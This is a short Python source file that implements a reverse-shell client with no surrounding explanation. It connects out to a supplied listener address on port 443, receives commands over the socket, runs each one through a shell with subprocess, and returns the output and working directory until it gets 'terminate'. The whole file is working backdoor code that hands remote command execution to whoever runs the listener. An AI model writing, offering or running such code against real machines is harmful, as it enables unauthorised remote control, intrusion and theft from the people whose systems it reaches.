import ssl
import os
import socket
import subprocess

def connect(listener_ip_address):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((listener_ip_address, 443))
    return s

def shell(s):
    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = CMD.stdout.read() + CMD.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))